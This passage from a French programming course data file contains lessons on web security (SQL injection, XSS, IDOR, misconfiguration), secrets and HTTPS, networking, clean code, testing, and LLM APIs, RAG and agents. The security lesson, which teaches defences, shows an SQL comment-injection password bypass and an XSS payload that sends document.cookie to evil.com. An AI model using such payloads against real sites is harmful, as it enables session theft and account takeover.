-- '--' commente tout ce qui suit → contourne le mot de passe !

-- ✅ Protection : requêtes préparées
SELECT * FROM users WHERE email = $1 AND password = $2
-- Les paramètres sont échappés automatiquement
\`\`\`

## 2. XSS (Cross-Site Scripting)

L'attaquant injecte du JavaScript malveillant dans une page.

\`\`\`
Attaquant soumet dans un commentaire :
<script>document.location='evil.com?c='+document.cookie</script>

Ce script s'exécute chez tous les visiteurs → vol de cookies/sessions

✅ Protection :
- Jamais : element.innerHTML = userInput
- Toujours : element.textContent = userInput
- Échapper l'HTML avant affichage
\`\`\`

## 3. Authentification cassée

\`\`\`
❌ Problèmes courants :
- Mots de passe stockés en clair ou MD5/SHA1
- Pas de rate limiting sur le login → brute force possible
- Sessions qui n'expirent jamais
- Tokens JWT avec algorithme "none" accepté

✅ Solutions :
- bcrypt/argon2 pour les mots de passe
- Rate limiting : max 5 tentatives, puis blocage
- Expiration des tokens (1h access, 7j refresh)
\`\`\`

## 4. Exposition de données sensibles

\`\`\`
❌ Problèmes courants :
- API retourne le hash du mdp dans l'objet user
- Clés API dans le code source (pushées sur GitHub)
- Connexion DB sans SSL
- Logs qui contiennent des mots de passe

✅ Solutions :
- Retourner uniquement les champs nécessaires
- Variables d'environnement pour les secrets
- HTTPS partout, SSL pour les connexions DB
\`\`\`

## 5. IDOR (Broken Access Control)

\`\`\`
GET /api/factures/1234
→ Retourne la facture 1234

Si l'API ne vérifie pas que cette facture appartient
à l'utilisateur connecté → n'importe qui peut voir
les factures des autres en changeant l'ID !

✅ Protection :
- Toujours vérifier : "cette ressource appartient-elle à cet user ?"
- Utiliser des UUIDs plutôt que des IDs numériques séquentiels
\`\`\`

## 6. Mauvaise configuration

\`\`\`
❌ Problèmes courants :
- Mode debug en production (expose les stack traces)
- Identifiants par défaut non changés (admin/admin)
- CORS trop permissif (allow *)
- Headers de sécurité manquants

✅ Headers essentiels :
Content-Security-Policy: default-src 'self'
X-Frame-Options: DENY
X-Content-Type-Options: nosniff
Strict-Transport-Security: max-age=31536000
\`\`\`

## Règle d'or

> **Ne jamais faire confiance aux données venant du client.**

Valide et assainis TOUJOURS les entrées côté serveur, même si tu as une validation côté frontend.`
      },
      {
        id: "securite-secrets",
        title: "Gestion des secrets et HTTPS",
        duration: "12 min",
        content: `# Gestion des secrets et HTTPS

## HTTP vs HTTPS

\`\`\`
HTTP (non chiffré) :
Navigateur ──── "password=secret123" ────► Serveur
           ← lisible par quiconque intercepte le trafic →

HTTPS (chiffré avec TLS) :
Navigateur ──── "Xk9#mP2$nQ..." (chiffré) ────► Serveur
           ← incompréhensible même si intercepté →
\`\`\`

## Comment fonctionne TLS

\`\`\`
1. Client envoie "Bonjour, je supporte TLS 1.3"
2. Serveur envoie son certificat (clé publique + identité)
   "Je suis bien github.com, signé par Let's Encrypt"
3. Client vérifie le certificat via une Autorité de Certification
4. Échange de clé de session (chiffrée avec la clé publique)
5. Communication chiffrée avec la clé de session
\`\`\`

## Les certificats SSL/TLS

\`\`\`
Qui délivre ? → Autorités de Certification (CA)
               Let's Encrypt (gratuit), DigiCert, Comodo...

Types :
DV (Domain Validation)   → vérifie que tu contrôles le domaine
                           Gratuit avec Let's Encrypt, suffisant pour 99%
OV (Organization Valid.) → vérifie aussi l'organisation
EV (Extended Valid.)     → vérification poussée, banques

Let's Encrypt :
→ Gratuit, automatique, renouvelé tous les 90 jours
→ Supporté par Certbot, Caddy, Vercel, Render...
→ Aucune raison de ne pas avoir HTTPS aujourd'hui
\`\`\`

## Gestion des secrets

\`\`\`
❌ NE JAMAIS faire :
API_KEY = "sk-abc123..."  ← dans le code source
git push origin main      ← maintenant la clé est sur GitHub, pour toujours
                            (même si tu la supprimes, elle reste dans l'historique)

✅ TOUJOURS faire :
API_KEY = os.getenv("API_KEY")    ← variable d'environnement

Outils :
- .env (local uniquement, dans .gitignore)
- Variables d'environnement du serveur (Render, Vercel, etc.)
- GitHub Secrets (pour les CI/CD)
- HashiCorp Vault, AWS Secrets Manager (entreprises)

Si tu as accidentellement pushé une clé :
1. Révoque-la IMMÉDIATEMENT chez le provider
2. Génères-en une nouvelle
3. Ne te contente pas de supprimer le commit
\`\`\`

## CORS : contrôler qui peut appeler ton API

\`\`\`
CORS (Cross-Origin Resource Sharing) :
→ Le navigateur bloque par défaut les requêtes vers un autre domaine
→ Le serveur doit explicitement autoriser les domaines clients

❌ Trop permissif :
Access-Control-Allow-Origin: *    ← tout le monde peut appeler ton API

✅ Correct :
Access-Control-Allow-Origin: https://monapp.com
Access-Control-Allow-Credentials: true  ← avec cookies/tokens
\`\`\``
      }
    ]
  },
  {
    id: "reseaux-http",
    category: "DevOps",
    emoji: "🌍",
    title: "Réseaux & HTTP",
    description: "Comment Internet fonctionne vraiment",
    level: "Intermédiaire",
    color: "#06B6D4",
    lessons: [
      {
        id: "internet-fonctionnement",
        title: "Comment fonctionne Internet",
        duration: "12 min",
        content: `# Comment fonctionne Internet

## Quand tu tapes une URL dans ton navigateur

\`\`\`
Tu tapes : https://github.com/mon-projet

Étape 1 — Résolution DNS
→ "C'est quoi l'IP de github.com ?"
→ Cache local → DNS de ton FAI → DNS Racine → DNS .com → DNS GitHub
→ Réponse : "140.82.121.4"

Étape 2 — Connexion TCP (3-way handshake)
Navigateur → SYN ──────────► Serveur
Navigateur ◄── SYN-ACK ───── Serveur
Navigateur → ACK ──────────► Serveur
(~30ms)

Étape 3 — Handshake TLS (HTTPS)
→ 2 allers-retours pour établir le chiffrement

Étape 4 — Requête HTTP
GET /mon-projet HTTP/2
Host: github.com

Étape 5 — Réponse
HTTP/2 200 OK → HTML de la page

Étape 6 — Rendu
→ Parser HTML → découvrir CSS, JS, images
→ Requêtes parallèles → DOM → affichage
\`\`\`

## TCP : la livraison garantie

\`\`\`
Les données sont découpées en paquets :
"Bonjour le monde !" → [Paquet 1: "Bonjour "] [Paquet 2: "le monde !"]

Chaque paquet peut prendre un chemin différent sur Internet !
TCP les réassemble dans le bon ordre à l'arrivée.
TCP garantit la livraison (retransmet si paquet perdu).

UDP (alternative) : pas de garantie, mais plus rapide
→ Streaming vidéo, jeux en ligne (mieux perdre un paquet que d'attendre)
\`\`\`

## DNS : l'annuaire d'Internet

\`\`\`
Types d'enregistrements :
A     : nom → IPv4          github.com → 140.82.121.4
AAAA  : nom → IPv6
CNAME : alias               www.github.com → github.com
MX    : serveur email       github.com → aspmx.l.google.com
TXT   : vérification de domaine, SPF, DKIM...

Propagation :
Quand tu changes un DNS → jusqu'à 48h pour propager
(TTL = durée de cache, souvent 3600s = 1h)
\`\`\`

## Latence : l'ennemi invisible

\`\`\`
Paris → Serveur à Paris       :  ~5 ms
Paris → Serveur à Londres     : ~15 ms
Paris → Serveur à New York    : ~80 ms
Paris → Serveur à Tokyo       : ~250 ms

→ Pourquoi les CDN existent : rapprocher les serveurs des utilisateurs
→ Cloudflare, AWS CloudFront, Fastly...
\`\`\``
      },
      {
        id: "http-protocole",
        title: "HTTP en profondeur",
        duration: "13 min",
        content: `# HTTP en profondeur

## Anatomie d'une requête

\`\`\`
POST /api/articles HTTP/1.1        ← ligne de requête (méthode + URL + version)
Host: api.monsite.com              ←
Content-Type: application/json       headers
Authorization: Bearer eyJhbGci...  ←

{                                  ← corps (body)
  "titre": "Mon article"
}
\`\`\`

## Anatomie d'une réponse

\`\`\`
HTTP/1.1 201 Created               ← status code
Content-Type: application/json     ← headers
Location: /api/articles/42

{                                  ← corps
  "id": 42,
  "titre": "Mon article"
}
\`\`\`

## Headers importants

\`\`\`
Requête :
Content-Type: application/json     → format du body envoyé
Authorization: Bearer {token}      → authentification
Cookie: session=abc123             → cookies

Réponse :
Content-Type: text/html; charset=utf-8   → format retourné
Cache-Control: max-age=3600              → mise en cache 1h
Set-Cookie: session=abc; HttpOnly        → créer un cookie sécurisé
X-Rate-Limit-Remaining: 45             → requêtes restantes
\`\`\`

## HTTP/1.1 vs HTTP/2 vs HTTP/3

\`\`\`
HTTP/1.1 (1997) :
→ Une requête à la fois par connexion
→ Head-of-line blocking : une requête lente bloque les autres

HTTP/2 (2015) :
→ Multiplexage : plusieurs requêtes en parallèle sur 1 connexion
→ Compression des headers
→ Utilisé par ~65% du web

HTTP/3 (2022) :
→ Basé sur UDP (via QUIC) au lieu de TCP
→ Meilleure gestion de la perte de paquets
→ Connexion plus rapide
\`\`\`

## WebSockets : communication bidirectionnelle

\`\`\`
HTTP classique :
Client → requête → Serveur → réponse
→ Le serveur ne peut PAS initier de communication

WebSocket :
Client ↔ Serveur : messages en temps réel dans les deux sens
→ Chat, notifications live, collaboration, jeux

wss:// = WebSocket sécurisé (comme HTTPS pour le HTTP)
\`\`\`

## SSE : Server-Sent Events

\`\`\`
Entre HTTP classique et WebSocket :
→ Le serveur peut envoyer des événements au client (unidirectionnel)
→ Plus simple que WebSocket pour les cas où seul le serveur envoie

Cas d'usage : streaming de réponses LLM (comme ChatGPT),
notifications, mises à jour de statut en temps réel
\`\`\``
      }
    ]
  },
  {
    id: "bonnes-pratiques",
    category: "Fondamentaux",
    emoji: "⭐",
    title: "Bonnes Pratiques Dev",
    description: "Écrire du code maintenable, lisible et solide",
    level: "Intermédiaire",
    color: "#EC4899",
    lessons: [
      {
        id: "clean-code",
        title: "Code propre : les principes",
        duration: "13 min",
        content: `# Code propre

Un code propre se lit comme de la prose : évident, sans surprise.

## Nommage : la base de tout

\`\`\`python
# ❌ Mauvais
def calc(a, b, t):
    return a * b * (1 + t/100)

x = calc(50, 3, 20)

# ✅ Bon
def calculer_prix_total(prix_unitaire, quantite, taux_tva_pourcent):
    return prix_unitaire * quantite * (1 + taux_tva_pourcent / 100)

prix_total = calculer_prix_total(prix_unitaire=50, quantite=3, taux_tva_pourcent=20)
\`\`\`

**Règles :**
- Variables/fonctions : ce qu'elles **font** ou **contiennent**
- Booléens : commence par \`is_\`, \`has_\`, \`can_\`
- Pas d'abréviations cryptiques (\`usr\`, \`cnt\`, \`tmp\`)

## Une fonction = une responsabilité

\`\`\`python
# ❌ Fonction qui fait tout
def traiter_commande(commande):
    # valide + calcule + envoie email + sauvegarde en DB
    ...

# ✅ Chaque fonction fait une chose
def valider_commande(commande): ...
def calculer_total_ttc(items): ...
def confirmer_commande(commande, db, mailer):
    valider_commande(commande)
    total = calculer_total_ttc(commande.items)
    db.save(commande)
    mailer.envoyer_confirmation(commande.client_email, total)
\`\`\`

## Les commentaires : quand et comment

\`\`\`python
# ❌ Commenter ce qui est évident
i += 1  # incrémente i de 1

# ❌ Code mort commenté (supprime-le !)
# ancienne_fonction()

# ✅ Commenter le POURQUOI
# Délai requis par l'API externe (rate limit 10 req/sec)
time.sleep(0.1)

# ✅ Expliquer la logique métier non évidente
# La suppression d'une adresse principale nécessite
# de désigner une autre adresse comme principale
def supprimer_adresse(user, adresse): ...
\`\`\`

## DRY — Don't Repeat Yourself

\`\`\`python
# ❌ Code dupliqué
def créer_admin(nom, email, mdp):
    if not email or '@' not in email:  # dupliqué !
        raise ValueError("Email invalide")
    hashed = bcrypt.hash(mdp)          # dupliqué !
    return Admin(...)

def créer_user(nom, email, mdp):
    if not email or '@' not in email:  # dupliqué !
        raise ValueError("Email invalide")
    hashed = bcrypt.hash(mdp)          # dupliqué !
    return User(...)

# ✅ Factoriser
def valider_email(email):
    if not email or '@' not in email:
        raise ValueError("Email invalide")

def créer_compte(nom, email, mdp, role='user'):
    valider_email(email)
    return Compte(nom=nom, email=email,
                  password=bcrypt.hash(mdp), role=role)
\`\`\``
      },
      {
        id: "tests",
        title: "Tester son code",
        duration: "14 min",
        content: `# Tester son code

## Pourquoi tester ?

\`\`\`
Sans tests :                  Avec tests :
────────────                  ────────────
"Ça marchait hier..."         Déploie en confiance
Peur de refactoriser          Refactorise librement
Bugs découverts en prod       Bugs détectés avant la prod
"Ça marche sur ma machine"    CI/CD vérifie sur tous les envs
\`\`\`

## La pyramide des tests

\`\`\`
       /\\
      /E2E\\           Tests end-to-end (rare, lent)
     /──────\\          Simule un vrai utilisateur (Playwright, Cypress)
    /Intégra-\\
   /  tion    \\       Tests d'intégration (modéré)
  /────────────\\       Teste plusieurs composants ensemble
 / Unitaires    \\     Tests unitaires (nombreux, rapides)
/────────────────\\     Teste une fonction isolément
\`\`\`

## Tests unitaires

\`\`\`python
def calculer_remise(prix, pourcentage):
    if pourcentage < 0 or pourcentage > 100:
        raise ValueError("Remise invalide")
    return prix * (1 - pourcentage / 100)

# Tests
def test_remise_normale():
    assert calculer_remise(100, 20) == 80.0

def test_remise_zero():
    assert calculer_remise(50, 0) == 50.0

def test_remise_totale():
    assert calculer_remise(100, 100) == 0.0

def test_remise_negative_leve_exception():
    with pytest.raises(ValueError):
        calculer_remise(100, -10)
\`\`\`

## Structure AAA

\`\`\`python
def test_créer_utilisateur(db_test):
    # Arrange : prépare les données
    email = "test@example.com"

    # Act : exécute la fonction à tester
    user = await UserService.créer(db_test, email=email, password="pass")

    # Assert : vérifie le résultat
    assert user.id is not None
    assert user.email == email
    assert user.hashed_password != "pass"  # bien hashé
\`\`\`

## Bonnes pratiques

\`\`\`
Quoi tester :
✅ Les cas normaux (happy path)
✅ Les cas limites (valeurs nulles, vides, extrêmes)
✅ Les cas d'erreur (exceptions attendues)
❌ Les getters/setters triviaux
❌ Le code tiers (déjà testé par ses auteurs)

Règles FIRST :
Fast        : tests unitaires en millisecondes
Isolated    : chaque test est indépendant
Repeatable  : même résultat à chaque exécution
Self-valid  : succès ou échec clair
Timely      : écrit en même temps que le code
\`\`\``
      }
    ]
  },
  {
    id: "ia-llm",
    category: "IA & LLM",
    emoji: "🤖",
    title: "IA & LLMs",
    description: "Intégrer des modèles de langage dans tes applications",
    level: "Intermédiaire",
    color: "#A855F7",
    lessons: [
      {
        id: "llm-concepts",
        title: "Comment fonctionnent les LLMs",
        duration: "14 min",
        content: `# Comment fonctionnent les LLMs

Un **LLM** (Large Language Model) est un modèle d'IA entraîné sur des milliards de textes pour prédire le prochain mot (token) le plus probable.

## L'idée fondamentale

\`\`\`
Entrée : "La capitale de la France est"
LLM calcule la probabilité de chaque mot suivant :
  "Paris"      → 94.2%
  "Lyon"       → 2.1%
  "une belle"  → 1.8%
  ...
→ Choisit "Paris"

Ce processus se répète token par token pour générer du texte.
\`\`\`

## Les concepts clés

\`\`\`
Token :
→ Unité de base traitée par le LLM
→ Environ 3/4 d'un mot en anglais, un peu moins en français
→ "bonjour" = 1 token, "extraordinaire" = 2-3 tokens
→ 1000 tokens ≈ 750 mots

Context Window (fenêtre de contexte) :
→ Nombre maximum de tokens que le modèle peut traiter d'un coup
→ GPT-4 : 128 000 tokens (~100 000 mots)
→ Claude Sonnet : 200 000 tokens
→ Llama 3 : 8 000 à 128 000 tokens selon la version

Temperature :
→ Contrôle le caractère aléatoire des réponses
→ 0.0 = déterministe (toujours la même réponse)
→ 0.7 = équilibre créativité/cohérence (recommandé)
→ 1.5 = très créatif mais peut délirer

Hallucination :
→ Le modèle génère des informations fausses avec confiance
→ Cause : il optimise la vraisemblance du texte, pas la vérité
→ Solution : RAG, vérification des sources, température basse
\`\`\`

## Les types de modèles

\`\`\`
Closed-source (API payante) :
  GPT-4o, GPT-4 Turbo     → OpenAI    → Très capables, chers
  Claude 3.5 Sonnet        → Anthropic → Excellent pour le code
  Gemini 1.5 Pro           → Google    → Grande fenêtre de contexte

Open-source (gratuit, auto-hébergeable) :
  Llama 3 (70B)            → Meta       → Très performant
  Mistral / Mixtral        → Mistral AI → Excellent rapport qualité/taille
  Qwen 2.5                 → Alibaba    → Multilingue
  Phi-3                    → Microsoft  → Petit mais efficace

Via API gratuite :
  OpenRouter.ai            → Accès unifié à 100+ modèles
  Groq                     → Llama/Mistral ultra rapide (gratuit limité)
  Google AI Studio         → Gemini gratuit
  Hugging Face             → Hébergement de modèles open-source
\`\`\`

## Inférence : où tourner un LLM ?

\`\`\`
Cloud (API) :
→ Simple, scalable, pas de GPU requis
→ Coût : ~$0.002-0.06 par 1000 tokens selon modèle
→ Latence : 50-500ms pour les premiers tokens

Local (Ollama, LM Studio) :
→ Gratuit, privé, hors ligne
→ Requiert un GPU (ou CPU lent)
→ Modèles jusqu'à 70B params sur un bon GPU
→ ollama run llama3 → chat en local

Edge (petits modèles) :
→ Phi-3 Mini, Llama 3.2 1B : tournent sur mobile ou navigateur
→ WebLLM : LLM directement dans le navigateur (WebGPU)
\`\`\``
      },
      {
        id: "llm-api-calls",
        title: "Appeler une API IA : pratique complète",
        duration: "18 min",
        content: `# Appeler une API IA : pratique complète

## OpenAI API (standard devenu universel)

La quasi-totalité des APIs IA (OpenAI, Groq, OpenRouter, Mistral, Ollama...) utilisent le même format.

\`\`\`python
# pip install openai
from openai import OpenAI

client = OpenAI(api_key="sk-...")

# Appel simple
response = client.chat.completions.create(
    model="gpt-4o-mini",
    messages=[
        {"role": "system", "content": "Tu es un assistant développeur expert."},
        {"role": "user", "content": "Explique ce qu'est un index de base de données."}
    ],
    temperature=0.7,
    max_tokens=500
)

print(response.choices[0].message.content)
print(f"Tokens utilisés : {response.usage.total_tokens}")
\`\`\`

## Même code, modèle différent (Groq, OpenRouter, Ollama)

\`\`\`python
# Groq (ultra rapide, gratuit)
client = OpenAI(
    base_url="https://api.groq.com/openai/v1",
    api_key="gsk_..."
)
response = client.chat.completions.create(
    model="llama-3.1-70b-versatile",
    messages=[...]
)

# OpenRouter (100+ modèles gratuits)
client = OpenAI(
    base_url="https://openrouter.ai/api/v1",
    api_key="sk-or-..."
)
response = client.chat.completions.create(
    model="meta-llama/llama-3.1-8b-instruct:free",
    messages=[...]
)

# Ollama (local, gratuit)
client = OpenAI(
    base_url="http://localhost:11434/v1",
    api_key="ollama"  # pas de vraie clé
)
response = client.chat.completions.create(
    model="llama3.2",
    messages=[...]
)
\`\`\`

## Streaming : afficher les tokens au fur et à mesure

\`\`\`python
# Sans streaming : attend toute la réponse (~5-10s)
# Avec streaming : affiche dès le premier token (~100ms)

stream = client.chat.completions.create(
    model="gpt-4o-mini",
    messages=[{"role": "user", "content": "Écris un poème sur Python"}],
    stream=True  # ← activer le streaming
)

for chunk in stream:
    if chunk.choices[0].delta.content is not None:
        print(chunk.choices[0].delta.content, end="", flush=True)

# En FastAPI (Server-Sent Events) :
from fastapi.responses import StreamingResponse

async def chat_stream(message: str):
    async def generate():
        stream = client.chat.completions.create(
            model="gpt-4o-mini",
            messages=[{"role": "user", "content": message}],
            stream=True
        )
        for chunk in stream:
            content = chunk.choices[0].delta.content
            if content:
                yield f"data: {json.dumps({'content': content})}\\n\\n"
        yield "data: [DONE]\\n\\n"

    return StreamingResponse(generate(), media_type="text/event-stream")
\`\`\`

## Gérer l'historique de conversation

\`\`\`python
# Les LLMs sont sans état : tu dois renvoyer tout l'historique
historique = [
    {"role": "system", "content": "Tu es un assistant développeur."}
]

def chat(message_utilisateur: str) -> str:
    # Ajouter le message de l'utilisateur
    historique.append({"role": "user", "content": message_utilisateur})

    # Appeler l'API avec tout l'historique
    response = client.chat.completions.create(
        model="gpt-4o-mini",
        messages=historique
    )

    réponse = response.choices[0].message.content

    # Sauvegarder la réponse dans l'historique
    historique.append({"role": "assistant", "content": réponse})

    return réponse

# Tour 1
print(chat("Qu'est-ce qu'un index SQL ?"))
# Tour 2 (le modèle se souvient du contexte)
print(chat("Et quand ne faut-il PAS en créer ?"))
\`\`\`

## Coûts et optimisation

\`\`\`
Modèles par rapport qualité/coût :
gpt-4o-mini   : $0.15/1M tokens in, $0.60/1M out  → très bon rapport
claude-haiku  : $0.25/1M tokens in, $1.25/1M out  → rapide et économique
gpt-4o        : $5/1M tokens in, $15/1M out        → réservé aux tâches complexes

Optimisations :
→ Utiliser des modèles plus petits pour les tâches simples
→ Mettre en cache les réponses répétitives (même prompt → même réponse)
→ Limiter max_tokens selon le besoin
→ Compresser l'historique quand il devient trop long
\`\`\``
      },
      {
        id: "llm-prompting",
        title: "Prompt Engineering",
        duration: "15 min",
        content: `# Prompt Engineering

La qualité du prompt détermine à 80% la qualité de la réponse.

## Les techniques fondamentales

### 1. Soyez précis et contextuel

\`\`\`
❌ Vague :
"Améliore mon code"

✅ Précis :
"Tu es un expert Python senior.
Révise cette fonction pour :
1. La rendre plus performante (elle est appelée 10 000x/seconde)
2. Ajouter une gestion d'erreurs robuste
3. La documenter avec des docstrings Google style

Voici le code : [CODE]

Explique chaque modification et pourquoi tu l'as faite."
\`\`\`

### 2. Few-Shot Prompting (donner des exemples)

\`\`\`
Classe ces commentaires en positif/négatif/neutre :

Exemples :
"Ce produit est fantastique !" → positif
"Livraison en retard, déçu"   → négatif
"Reçu hier"                   → neutre

Maintenant classe :
"La qualité est médiocre pour le prix"  → ?
"Emballage soigné, livraison rapide"    → ?
\`\`\`

### 3. Chain of Thought (raisonnement étape par étape)

\`\`\`
❌ Sans CoT :
"Quel est le résultat de ce code ?"
→ Risque d'erreur sur les calculs complexes

✅ Avec CoT :
"Quel est le résultat de ce code ?
Raisonne étape par étape avant de donner ta réponse finale."
→ Le modèle décompose avant de conclure, beaucoup plus précis
\`\`\`

### 4. System Prompt : définir le rôle

\`\`\`python
messages = [
    {
        "role": "system",
        "content": """Tu es un senior développeur backend avec 10 ans d'expérience
en Python, FastAPI et PostgreSQL.
Tu donnes des réponses concises et directement applicables.
Tu signales toujours les problèmes de sécurité ou de performance potentiels.
Tu utilises des exemples de code réels, pas des pseudocodes."""
    },
    {
        "role": "user",
        "content": "Comment implémenter le rate limiting sur mon API ?"
    }
]
\`\`\`

## Patterns de prompts utiles

\`\`\`
Analyse de code :
"Analyse ce code et liste :
- Les bugs potentiels
- Les problèmes de sécurité
- Les améliorations de performance
- La lisibilité
Priorise par criticité."

Génération de code :
"Génère [QUOI] en [LANGAGE] qui :
- Fait [FONCTIONNALITÉ 1]
- Gère [CAS D'ERREUR]
- Respecte [CONTRAINTE]
N'inclus pas de commentaires inutiles.
Le code doit être prêt pour la production."

Explication :
"Explique [CONCEPT] comme si j'étais un développeur junior
qui connaît Python mais pas les systèmes distribués.
Utilise une analogie du monde réel.
Termine par 3 points clés à retenir."
\`\`\`

## Structured Output : forcer le format JSON

\`\`\`python
from pydantic import BaseModel

class AnalyseCode(BaseModel):
    bugs: list[str]
    securite: list[str]
    score_qualite: int  # 0-100
    recommandation_principale: str

# OpenAI supporte le structured output natif
response = client.beta.chat.completions.parse(
    model="gpt-4o-mini",
    messages=[
        {"role": "user", "content": f"Analyse ce code : {code}"}
    ],
    response_format=AnalyseCode,
)

analyse = response.choices[0].message.parsed
print(analyse.score_qualite)  # 78
print(analyse.bugs)           # ["Variable non initialisée ligne 12", ...]
\`\`\``
      },
      {
        id: "llm-rag",
        title: "RAG : connecter l'IA à tes données",
        duration: "16 min",
        content: `# RAG : Retrieval-Augmented Generation

Le RAG permet à un LLM de répondre à des questions sur **tes propres données** sans les avoir vues pendant l'entraînement.

## Le problème que RAG résout

\`\`\`
LLM classique :
"Quelle est la politique de remboursement de notre entreprise ?"
→ "Je n'ai pas accès à cette information."
→ Ou pire : hallucination

LLM + RAG :
1. Cherche dans la documentation interne les passages pertinents
2. Injecte ces passages dans le prompt
3. Le LLM répond en s'appuyant sur les vraies données
→ Réponse précise et sourcée
\`\`\`

## Comment ça fonctionne

\`\`\`
Phase 1 — Indexation (une seule fois) :
┌─────────────────────────────────────────────────────┐
│  Documents (PDF, Word, code, wiki...)               │
│       ↓  découper en chunks (500-1000 tokens)       │
│  [chunk1] [chunk2] [chunk3] ...                     │
│       ↓  transformer en vecteurs (embeddings)       │
│  [0.2, 0.8, -0.3, ...] (1536 dimensions)           │
│       ↓  stocker dans une vector database           │
│  Pinecone, Weaviate, pgvector (PostgreSQL)          │
└─────────────────────────────────────────────────────┘

Phase 2 — Requête (à chaque question) :
Question utilisateur
    ↓  convertir en vecteur (même modèle d'embedding)
    ↓  chercher les N chunks les plus proches (cosine similarity)
    ↓  construire le prompt :
       "Contexte : [chunks pertinents]
        Question : [question utilisateur]
        Réponds uniquement à partir du contexte fourni."
    ↓  envoyer au LLM → réponse précise et sourcée
\`\`\`

## Les embeddings : représenter le sens

\`\`\`python
# Un embedding transforme du texte en vecteur numérique
# Textes similaires → vecteurs proches dans l'espace

from openai import OpenAI
client = OpenAI()

def créer_embedding(texte: str) -> list[float]:
    response = client.embeddings.create(
        model="text-embedding-3-small",  # rapide et économique
        input=texte
    )
    return response.data[0].embedding  # liste de 1536 floats

# Exemple
v1 = créer_embedding("Comment créer un index SQL ?")
v2 = créer_embedding("Optimiser les requêtes de base de données")
v3 = créer_embedding("Recette de tarte aux pommes")

# v1 et v2 seront très proches (même sujet)
# v3 sera très loin de v1 et v2
\`\`\`

## Implémentation simple avec pgvector

\`\`\`python
# PostgreSQL + extension pgvector = vector DB gratuite
# pip install pgvector sqlalchemy

# Modèle de table
class Document(Base):
    __tablename__ = "documents"
    id = Column(Integer, primary_key=True)
    contenu = Column(Text)
    source = Column(String)
    embedding = Column(Vector(1536))  # pgvector

# Indexer un document
async def indexer(contenu: str, source: str):
    embedding = créer_embedding(contenu)
    doc = Document(contenu=contenu, source=source, embedding=embedding)
    db.add(doc)
    await db.commit()

# Rechercher les chunks pertinents
async def rechercher(question: str, k: int = 5):
    query_embedding = créer_embedding(question)
    # Cosine similarity avec pgvector
    résultats = await db.execute(
        select(Document)
        .order_by(Document.embedding.cosine_distance(query_embedding))
        .limit(k)
    )
    return résultats.scalars().all()

# Répondre avec RAG
async def répondre_avec_rag(question: str) -> str:
    chunks = await rechercher(question)
    contexte = "\\n\\n".join([c.contenu for c in chunks])

    response = client.chat.completions.create(
        model="gpt-4o-mini",
        messages=[
            {"role": "system", "content": "Réponds uniquement à partir du contexte fourni. Si la réponse n'est pas dans le contexte, dis-le."},
            {"role": "user", "content": f"Contexte :\\n{contexte}\\n\\nQuestion : {question}"}
        ]
    )
    return response.choices[0].message.content
\`\`\`

## Bonnes pratiques RAG

\`\`\`
Taille des chunks :
→ Trop petits (< 100 tokens) : manque de contexte
→ Trop grands (> 1000 tokens) : bruit, moins précis
→ Optimal : 300-600 tokens avec 50 tokens de chevauchement

Améliorer la qualité :
→ Re-ranking : après la recherche vectorielle, reclasser avec un modèle
→ Hybrid search : combiner recherche vectorielle + BM25 (recherche par mots-clés)
→ HyDE : générer une réponse hypothétique, puis chercher par similarité
→ Métadonnées : filtrer par date, auteur, catégorie avant la recherche
\`\`\``
      },
      {
        id: "llm-agents",
        title: "Agents IA et Function Calling",
        duration: "15 min",
        content: `# Agents IA et Function Calling

Un **agent IA** est un LLM qui peut utiliser des **outils** (fonctions, APIs, bases de données) pour accomplir des tâches complexes.

## Function Calling : donner des outils au LLM

\`\`\`python
# Définir les outils disponibles
outils = [
    {
        "type": "function",
        "function": {
            "name": "chercher_meteo",
            "description": "Obtenir la météo actuelle d'une ville",
            "parameters": {
                "type": "object",
                "properties": {
                    "ville": {"type": "string", "description": "Nom de la ville"},
                    "unite": {"type": "string", "enum": ["celsius", "fahrenheit"]}
                },
                "required": ["ville"]
            }
        }
    },
    {
        "type": "function",
        "function": {
            "name": "créer_rappel",
            "description": "Créer un rappel dans le calendrier",
            "parameters": {
                "type": "object",
                "properties": {
                    "titre": {"type": "string"},
                    "datetime": {"type": "string", "description": "Format ISO 8601"},
                },
                "required": ["titre", "datetime"]
            }
        }
    }
]

# Le LLM décide quels outils utiliser
response = client.chat.completions.create(
    model="gpt-4o-mini",
    messages=[{"role": "user", "content": "Quel temps fait-il à Paris ? Et crée un rappel pour sortir le parapluie demain à 8h si il pleut."}],
    tools=outils,
    tool_choice="auto"  # le modèle choisit
)

# Si le modèle veut appeler une fonction
if response.choices[0].finish_reason == "tool_calls":
    tool_call = response.choices[0].message.tool_calls[0]
    print(tool_call.function.name)   # "chercher_meteo"
    print(tool_call.function.arguments)  # '{"ville": "Paris", "unite": "celsius"}'
\`\`\`

## La boucle agentique complète

\`\`\`python
import json

def exécuter_outil(nom: str, arguments: dict):
    """Exécuter le vrai outil et retourner le résultat"""
    if nom == "chercher_meteo":
        # Appel réel à l'API météo
        return {"ville": arguments["ville"], "temp": 12, "condition": "nuageux"}
    elif nom == "créer_rappel":
        return {"status": "créé", "id": "rem_123"}

def agent(message_utilisateur: str):
    messages = [{"role": "user", "content": message_utilisateur}]

    while True:
        response = client.chat.completions.create(
            model="gpt-4o-mini",
            messages=messages,
            tools=outils,
            tool_choice="auto"
        )

        choix = response.choices[0]
        messages.append(choix.message)  # ajouter la réponse du modèle

        # Pas d'appel d'outil → réponse finale
        if choix.finish_reason == "stop":
            return choix.message.content

        # Exécuter tous les outils demandés
        for tool_call in choix.message.tool_calls:
            args = json.loads(tool_call.function.arguments)
            résultat = exécuter_outil(tool_call.function.name, args)

            # Ajouter le résultat dans l'historique
            messages.append({
                "role": "tool",
                "tool_call_id": tool_call.id,
                "content": json.dumps(résultat)
            })
        # Reboucle → le modèle reçoit les résultats et continue
\`\`\`

## Les frameworks d'agents

\`\`\`
LangChain :
→ Le plus populaire, très complet
→ Agents, RAG, chaînes de traitement, mémoire
→ Peut devenir complexe et abstrait

LlamaIndex :
→ Spécialisé RAG et recherche sur documents
→ Plus simple que LangChain pour ce cas d'usage

CrewAI :
→ Multi-agents : plusieurs IA avec des rôles différents
→ Agent "chercheur" + Agent "rédacteur" + Agent "réviseur"

Pydantic AI :
→ Framework léger, type-safe
→ Très bien intégré à FastAPI/Python moderne

Claude Agent SDK (Anthropic) :
→ Optimisé pour Claude
→ Gestion native des outils et des agents longs
\`\`\`

## Quand utiliser un agent vs un LLM simple ?

\`\`\`
LLM simple (prompt + réponse) :
→ Résumer un texte
→ Traduire
→ Générer du code à partir d'une description
→ Répondre à une question simple

Agent (avec outils) :
→ "Recherche les 5 derniers articles sur React et fais-en un résumé"
